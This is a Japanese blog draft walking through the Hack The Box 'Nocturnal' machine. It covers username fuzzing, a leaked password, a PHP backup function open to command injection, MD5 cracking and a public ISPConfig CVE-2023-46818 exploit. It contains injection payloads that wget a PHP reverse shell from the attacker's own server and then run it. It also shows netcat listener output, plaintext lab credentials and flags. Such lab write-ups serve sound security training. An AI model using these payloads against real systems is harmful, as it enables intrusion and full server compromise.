+++
author = "Hugo Authors"
title = "HTB Nocturnal"
date = "2025-06-01"
description = ""
tags = [
    "HTB",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png"
draft = true
+++

HTB Nocturnalのメモ．
<!--more-->

## User Flag

```
$ nmap -Pn -T4 -sV -sC -A 10.10.11.64
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-01 15:08 JST
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/1%OT=22%CT=1%CU=43925%PV=Y%DS=2%DC=T%G=Y%TM=683BE
OS:E92%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542S
OS:T11NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E
OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   364.26 ms 10.10.16.1
2   181.93 ms nocturnal.htb (10.10.11.64)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.17 seconds
```

Webサイトがあるので，以下を追加してアクセス．

```
$ sudo vi /etc/hosts
10.10.11.64     nocturnal.htb
```

login と register があり，ログイン後ファイルのアップロードと閲覧ができる．
アップロードできるファイルは pdf, doc, docx, xls, xlsx, odt に制限されている．

ユーザ名：test，ファイル名：test.doc でアプロードすると，ファイルは，`/view.php?username=test&file=test.doc`で閲覧できる．

Burp Suite でCookie等を取得し，ユーザ名でファジングしてみる．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/htb-nocturnal/im01.png)

存在しないユーザ名の際のContent-Length: 2985 は除外する．
```
$ ffuf -w names.txt -u "http://nocturnal.htb/view.php?username=FUZZ&file=test.doc" -H "Cookie: PHPSESSID=jlspivkvg5knrgjql28v21i667" -fs 2985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test.doc
 :: Wordlist         : FUZZ: /home/krimm/HTB/names.txt
 :: Header           : Cookie: PHPSESSID=jlspivkvg5knrgjql28v21i667
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 188ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 185ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 185ms]
:: Progress: [10713/10713] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```

`admin`, `amanda`, `tobias`の3つがヒット．特に．`amanda`でアクセスすると，`privacy.odt`というファイルが閲覧可能な状態にある．
クリックしてダウンロードし，解凍してpasswordなどを探す．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/htb-nocturnal/im02.png)

```
$ grep -r "pass" ./privacy 
./privacy/content.xml:...Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure....
```

よって，`amanda` / `arHkG7HAI68X8s1J` でログインする．

ログイン成功し，Admin Panel が見れる．ここでは，いくつかのソースコードの閲覧とバックアップ作成機能があり，任意のパスワードを入力すると，そのままコマンドが実行される．入力したパスワードはcleanEntry関数でフィルタリングされるが，フィルタリングが十分ではないため，OSコマンドインジェクションが可能．

```php
<?php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>

```

具体的には，URLエンコードで %09 (tab) や %0A (newline) を用いることで，フィルタリングを回避可能．

その前にリバースシェルの準備をしておく．以下から`php-reverse-shell.php`をダウンロードする（以下`shell.php`），

php-reverse-shell:  
https://github.com/pentestmonkey/php-reverse-shell

`shell.php`のあるディレクトリで，以下を実行し簡易サーバを立てる．
これで，ダウンロードしたい場所で`wget [自分のIPアドレス]:8000/shell.php"`とするとダウンロードできる．
```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

今回は，パスワードに`%0Abash%09-c%09"wget%09[自分のIPアドレス]:8000/shell.php"%0A`とすることで，ダウンロードさせる．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/htb-nocturnal/im03.png)

次に，netcatでリッスン状態にし，パスワードに`%0Abash%09-c%09"php%09shell.php"%0A`とすることで，shell.phpを実行させる．
```
$ nc -lvvp 4444
```

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/htb-nocturnal/im04.png)

リバースシェルが成功すると，接続される．

```
$ nc -lvvp 4444
connect to [10.10.■■■■■] from nocturnal.htb [10.10.11.64] 60026
Linux nocturnal 5.4.0-212-generic #232-Ubuntu SMP Sat Mar 15 15:34:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 05:24:13 up  4:19,  0 users,  load average: 0.02, 0.05, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd
$ ls
html
ispconfig
nocturnal.htb
nocturnal_database
php-fcgi-scripts
$ cd nocturnal_database
$ ls
nocturnal_database.db
```

nocturnal_database.dbを確認する．

ハッシュ値で格納されているが，MD5なので復号できる．

sshのユーザ名：`tobias`，パスワード：`slowmotionapocalypse`とわかる．

```
ssh tobias@nocturnal.htb
tobias@nocturnal:~$ id
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)

tobias@nocturnal:~$ ls
user.txt

tobias@nocturnal:~$ cat user.txt 
c6782b3ae9b06ca6e25795bb9d4d6ed7
```

## Privilege escalation

```
enzo@planning:~$ netstat -tuln
tobias@nocturnal:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:* 
```

以下のように，ローカルポートフォワーディングを用いて，`http://127.0.0.1:8080/`にアクセスできるようにする．

```
$ ssh -L 9000:127.0.0.1:8080 tobias@10.10.11.64
```

`http://127.0.0.1:9000/`にアクセスすると，ISPConfigのログイン画面になった．

`admin` / `slowmotionapocalypse` でログインできた．

ログイン後，Help から ISPConfig Version: 3.2.10p1 を確認．

このバージョンには，CVE-2023-46818の脆弱性がある．

CVE-2023-46818 exploit:  
https://github.com/bipbopbup/CVE-2023-46818-python-exploit

```
$ python3 exploit.py http://127.0.0.1:9000/ admin slowmotionapocalypse
[+] Target URL: http://127.0.0.1:9000/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)

ispconfig-shell# ls /root
root.txt
scripts

ispconfig-shell# cat /root/root.txt
d77592c40d0b7b194364ad200e903b50
```

参考： https://www.cnblogs.com/QiSamaQwQ/p/18837051  
https://github.com/Disturbante/HTB-writeups/blob/main/nocturnal.md